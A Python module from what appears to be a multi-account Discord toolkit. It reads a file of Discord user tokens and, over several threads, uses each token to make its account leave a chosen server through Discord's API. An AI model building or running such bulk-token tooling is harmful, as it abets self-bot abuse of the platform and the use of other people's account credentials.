import os
import time
import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore
from tkinter import Tk, filedialog

import modules.rpc_manager as rpc_manager
rpc_manager.set_details("Discord: Server Leaver")

class ServerLeaver:
    def __init__(self, parent):
        self.parent = parent
        
    def select_token_file(self):
        root = Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        file_path = filedialog.askopenfilename(
            title="Select Token File",
            filetypes=[
                ("Text files", "*.txt"),
                ("All files", "*.*")
            ]
        )
        root.destroy()
        return file_path
        
    def leave_server_with_token(self, token, server_id, current, total):
        try:
            headers = {
                'Authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{server_id}', 
                                     headers=headers, timeout=10)
            
            if response.status_code == 204:
                print(f"{Fore.GREEN}[{current}/{total}] ✓ Successfully left server: {token[:20]}...")
                with self.parent.lock:
                    self.parent.stats['left'] += 1
                return True
            elif response.status_code == 401:
                print(f"{Fore.RED}[{current}/{total}] ✗ Invalid token: {token[:20]}...")
            elif response.status_code == 404:
                print(f"{Fore.YELLOW}[{current}/{total}] ⚠ Not in server: {token[:20]}...")
            else:
                print(f"{Fore.RED}[{current}/{total}] ✗ Error ({response.status_code}): {token[:20]}...")
                
        except Exception as e:
            print(f"{Fore.RED}[{current}/{total}] ✗ Error: {token[:20]}... - {str(e)}")
            
        time.sleep(self.parent.delay_between_requests)
        return False
    
    def run(self):
        self.parent.clear_screen()
        self.parent.print_banner()
        
        print(f"{Fore.CYAN}SERVER LEAVER")
        print(f"{Fore.MAGENTA}{'='*30}")
        
        print(f"{Fore.YELLOW}Select token file...")
        token_file_path = self.select_token_file()
        
        if not token_file_path:
            print(f"{Fore.RED}No file selected!")
            input(f"\n{Fore.YELLOW}Press Enter to continue...")
            return
            
        if not os.path.exists(token_file_path):
            print(f"{Fore.RED}Token file not found: {token_file_path}")
            input(f"\n{Fore.YELLOW}Press Enter to continue...")
            return
        
        print(f"{Fore.GREEN}✓ Selected file: {token_file_path}")
        
        valid_tokens = []
        with open(token_file_path, 'r', encoding='utf-8') as f:
            valid_tokens = [line.strip() for line in f.readlines() if line.strip()]
        
        if not valid_tokens:
            print(f"{Fore.RED}Token file is empty!")
            input(f"\n{Fore.YELLOW}Press Enter to continue...")
            return
            
        server_id = input(f"{Fore.YELLOW}Server ID: ").strip()
        
        if not server_id:
            print(f"{Fore.RED}Invalid server ID!")
            input(f"\n{Fore.YELLOW}Press Enter to continue...")
            return
            
        threads = min(int(input(f"{Fore.YELLOW}Thread count (1-{self.parent.max_threads}): ") or "5"), self.parent.max_threads)
            
        print(f"\n{Fore.RED}Server leave starting...")
        print(f"{Fore.CYAN}Server ID: {server_id}")
        print(f"{Fore.CYAN}Valid Token Count: {len(valid_tokens)}")
        print(f"{Fore.CYAN}Thread Count: {threads}\n")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            for i, token in enumerate(valid_tokens):
                future = executor.submit(self.leave_server_with_token, token, server_id, i+1, len(valid_tokens))
                futures.append(future)
                
            left_count = 0
            for future in futures:
                try:
                    if future.result():
                        left_count += 1
                except Exception as e:
                    print(f"{Fore.RED}Error: {e}")
                    
        print(f"\n{Fore.GREEN}✓ Total {left_count} tokens left the server!")
        input(f"\n{Fore.YELLOW}Press Enter to continue...")